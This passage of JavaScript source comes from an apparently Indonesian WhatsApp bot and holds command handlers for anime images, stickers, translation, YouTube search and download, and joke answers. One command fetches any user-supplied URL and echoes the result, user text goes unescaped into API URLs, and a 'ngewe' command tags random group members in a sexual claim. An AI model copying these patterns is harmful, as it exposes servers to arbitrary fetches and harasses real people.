let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
break
           
           
       
           
         
        
           
           

case 'status':
case 'stats':
				var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalchat.length}
Speed : ${latensi.toFixed(4)} second
Runtime : ${kyun(uptime)}
Charged : ${baterai.isCharge}
Mode : ${publik ? 'public' : 'self'}
Prefix : 「 ${prefa} 」
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${xdev.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${xdev.user.phone.wa_version}
Os Version: ${xdev.user.phone.os_version}

⍟ ────────────────── ⍟`

setReply(stamtus)
break
				
           
           
           
           
           
           
           
           
           
           
           
     
           
           
           
           
           
           
           
           
           
           case 'anna':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Anna.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
           
           
           
           case 'asunayuki':
           
            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)          
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Asuna_yuki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
            
            
            
            
            
            case 'ayuzawa':
            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Ayuzawa_misaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
           
           
           
           
           case 'chitoge':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Chitoge_kirisaki.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
           
           
           
           
           case 'emilia':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Emilia.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
           
           
           
           
           case 'erza':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Erza_scarlet.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
           
           
           
           case 'hinata':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Hinata.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
            
            
            
            
            
            case 'naruto':
            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Naruto.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
            
            
            
            
            case 'sasuke':
            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            setReply(mess.wait)
            fetch('https://raw.githubusercontent.com/zeeoneofc/Ultroid/main/strings/Anime/Sasuke.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'[  ✓  ]  Sukses !'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            limitAdd(senderNumber, user)
            break
           
           
           
           
           
           case 'translate': case 'tr':
									try {
										if (args.length < 1)return setReply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
										if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) {
											translate(`${body.slice(10+args[0].length+1)}`, args[0])
											.then((res) => { setReply(`${res}`) })
											} else {
												tolang = args[0]
												entah = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
												translate(entah, tolang)
												.then((res) => { setReply(`${res}`) })
												}
											} catch (e) {
												setReply(`${e}`)
												}
											break
           
           
           
           
           
           
           
           
           
           
         
           
           
                   
           
           
          
           
           
           case 'wiki':
if (args.length < 1) return setReply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return setReply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: dev, caption: result}).catch(e => {
  setReply(result)
})
break
           
           
           
           
          
                
               
                    
		
           
           
                    
        
                    
        
           
           
          
		
				
                
           
           
           
           
           
       
       case 'loli':
       case 'milf':
       case 'husbu':
       case 'cosplay':
       case 'wallml':
         if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]
              imageMsg = ( await xdev.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await xdev.prepareMessageFromContent(from,{buttonsMessage},{quoted: dev})
              xdev.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              limitAdd(senderNumber, user)
              break  
           case 'narutoteks':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pNaruto(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url, q)
										})
									break
						case 'shadow':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pShadow(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'romantic':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pRomantic(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'smoke':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pSmoke(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'burnpaper':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pBurnPapper(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'lovemsg':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pLoveMsg(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'grass':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pMsgGrass(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'doubleheart':
									if (!q) return setReply('teksnya Lord?')
									setReply(mess.wait)
									pDoubleHeart(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						case 'coffecup':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pCoffeCup(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'lovetext':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pLoveText(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
									})
									break
						case 'butterfly':
									if (!q) return setReply('Teksnya Lord?')
									setReply(mess.wait)
									pButterfly(`${q}`)
									.then(res => {
										sendMediaURL(from, res.url)
										})
									break
						
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
    case 'buttons1':
       if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
               setReply('*Donwloading...*')
              if (args.length < 1) return setReply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return setReply('Error')
              teks = args.join(' ')
              res = await y2mateA(teks)
              sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'audio/mp3', filename: res[0].output})
              break
     case 'buttons2':
        if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
              setReply('*Donwloading...*')
              if (args.length < 1) return setReply('Link Nya Mana?')
              if(!isUrl(args[0]) && !args[0].includes('youtu')) return setReply(mess.error.Iv)
              teks = args.join(' ')
              res = await y2mateV(teks)
              sendFileFromUrl(res[0].link, document, {quoted: dev, mimetype: 'video/mp4', filename: res[0].output})
              break
              
       
             
           
           
           
           
           
           
           
        
        case 'attp':
        try {

              if (args.length == 0) return setReply(`Example: ${prefix + command} YUxdev`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              xdev.sendMessage(from, buffer, sticker, { quoted: dev })
               } catch (e) {
               console.log(e)
               setReply(`Maap sedang error coba lagi besok`)
              
}
              break
              
     
            
            
            case 'ytcomment':
uh = await xdev.getProfilePicture(sender)
res = await upload(uh)
link = `https://some-random-api.ml/canvas/youtube-comment?username=${pushname}&comment=${q}&avatar=${res}?q=60&dark=true%E2%80%8B`
buffer = await getBuffer(link)
xdev.sendMessage(from, buffer, image, {quoted: dev})
//sendFileFromUrl(link, image, {quoted: dev})
break
            
            
	         
   
case 'ttp':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break


case 'ttpred':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=red`
sendStickerUrl(from, anjay)
break

case 'ttpblue':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=blue`
sendStickerUrl(from, anjay)
break

case 'ttpyellow':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=yellow`
sendStickerUrl(from, anjay)
break

case 'ttpgreen':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=green`
sendStickerUrl(from, anjay)
break

case 'ttppurple':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=purple`
sendStickerUrl(from, anjay)
break

case 'ttppink':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=deeppink`
sendStickerUrl(from, anjay)
break
	
case 'ttpviolet':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=violet`
sendStickerUrl(from, anjay)
break

case 'ttpmagenta':
if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
setReply(mess.wait)
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=magenta`
sendStickerUrl(from, anjay)
break
	
	
	
	
	
	case 'got':
	const got = require('got');

(async () => {
	try {
		const response = await got('https://sindresorhus.com');
		console.log(response.body);
		//=> '<!doctype html> ...'
	} catch (error) {
		console.log(error.response.body);
		//=> 'Internal server error ...'
	}
})();
	break
	
	
	
case 'ttp2':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=white`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break


case 'ttp2red':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=red`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2blue':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=blue`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2green':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=green`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break
	
case 'ttp2yellow':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=yellow`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2pink':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=deeppink`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break


case 'ttp2magenta':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=magenta`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break
	
case 'ttp2purple':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=purple`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break

case 'ttp2violet':                     
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=violet`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break
	
	
	
	
	
	
	
	
case 'ttp3':
if (!q)return setReply(`Example : ${prefix + command} Senku`)
buffer = `https://pecundang.herokuapp.com/api/attp?teks=${q}`
setReply(mess.wait)
sendStickerUrl(from, buffer)
break



    case 'gura':
                case 'gurastick':{

                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]                    
                    sendStickerUrl(from, wifegerakx)

                    }
                    break          

 case 'get':
case 'fetch':
            if(!q) return setReply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            setReply(bu)
            
            })   
            break
        
        


        
        
        
           //By yudha perdana
           case 'wangy':
              if (!q) return setReply('query')
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              xdev.sendMessage(from, awikwok, text)
              break
           
           
           
           
           
           
              case 'yts':
              case 'ytsearch':
              if (!q) return setReply('Format salah')
              setReply('Tunggu sebentar')
              try {
              res = await yts(q)
              a = `*Youtube Search 🔎*\n`
for (let i of res.all) {
a += `
📜 Title : ${i.title}
??️ Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: dev, thumbnail: Buffer.alloc(0), caption: b, contextInfo: forward})
               } catch (e) {
               console.log(e)
               setReply(`${e}`)
}
               break
           
           
           
           
           
 
           
           

           case 'd':
				case 'del':
				case 'delete':
				if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply("Untuk menghapus reply pesan botnya")
				if(!isQuotedReply) return setReply("Reply pesan bot")
				premnih = dev.message.extendedTextMessage.contextInfo.participant
                
					xdev.deleteMessage(from, { id: dev.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					
					break
           
           
           
           
				
		
           
          
           
           
           
           
           
           case 'jadian':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           if(!isGroup) return setReply("Ga mau ah, lu jelek")
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ❤️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					limitAdd(senderNumber, user)
					break
	
case 'ngewe':
   if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if(!isGroup) return setReply("Maap om aku masih blom cukup umur")
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					limitAdd(senderNumber, user)
					break
           
           
				

				

			

           
           case 'memeindo':
           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
           data = fs.readFileSync('./lib/game/memeindo.js');
	       jsonData = JSON.parse(data);
           randIndex = Math.floor(Math.random() * jsonData.length);
	       randKey = jsonData[randIndex];        
           buffer = await getBuffer(randKey.result)
           xdev.sendMessage(from, buffer, image, {quoted : dev, caption : "Nih"})
           limitAdd(senderNumber, user)
           break
           
           
           
           
           case 'quotes':
           data = fs.readFileSync('./lib/game/quotes.js');
	       jsonData = JSON.parse(data);
           randIndex = Math.floor(Math.random() * jsonData.length);
	       randKey = jsonData[randIndex];        
           quotes = randKey.quotes
           xdev.sendMessage(from, quotes, text, {quoted : dev})
           break
           
           
           
           
           case 'diem':
			     if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
			if(!checkDataName("mute", from, DataId)) { createDataId("mute", DataId) }
                if (checkDataId ("mute", from, DataId) ) return setReply(`*aku udah diem nih*`)
                addDataId(from, "mute", DataId)
                setReply( `Baik kak 😥 `)
                break
                
                case 'udah':
      if (!isOwner) return onlyOwner()
			    if (!isGroup) return 
     
                removeDataId ("mute", from, DataId)
                setReply(`Oke kak 😁`)
            break
					
           
           
         
           
           
           
           case 'katailham':  
                       if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const su = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
					xdev.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: dev })
					limitAdd(senderNumber, user)
					break
					
					case 'bucin':
		            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
					xdev.sendMessage(from, ''+sa+'\n\n_-BUCIN._', text, { quoted: dev })
					limitAdd(senderNumber, user)
					break
           
 case 'bisakah':
					bisakah = body.slice(1)
					const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: dev })
					break

case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: dev })
					break
					
case 'apakah':
					apakah = body.slice(1)
					const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: dev })
					break
					
case 'bagaimanakah':
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: dev })
					break
					
case 'rate':
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					xdev.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: dev })
					break
					
case 'sangecek':
					sange = body.slice(1)
